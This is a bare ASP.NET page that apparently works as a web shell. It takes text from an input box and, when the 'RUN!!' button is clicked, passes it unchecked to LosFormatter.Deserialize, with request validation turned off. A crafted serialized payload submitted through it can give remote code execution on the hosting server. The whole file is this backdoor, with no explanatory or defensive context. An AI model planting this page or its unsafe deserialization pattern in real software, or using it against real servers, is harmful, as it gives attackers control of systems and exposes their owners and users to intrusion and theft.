<%@ Page Language="C#" Debug="true" validateRequest="false" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Runtime.Serialization" %>

<script runat="server">
protected void INPUT_Click(object sender, EventArgs e)
{

		LosFormatter Formatter = new LosFormatter();
		Formatter.Deserialize( INPUT.Text.ToString() );

}
</script>
<html>
<body>
<form id="Form1" runat="server" >
<asp:Panel ID="authentication" runat="server" HorizontalAlign="Center" >
<asp:TextBox runat="server" ID="INPUT" Value="" BackColor="#012456" ForeColor="White" style="width: 891px;"/>
<div runat="server" style="width: auto; text-align:center">
<asp:Button ID="Click" runat="server" Text="RUN!!" OnClick="INPUT_Click" />
</div>
</asp:Panel >
</form>
</body>
</html>

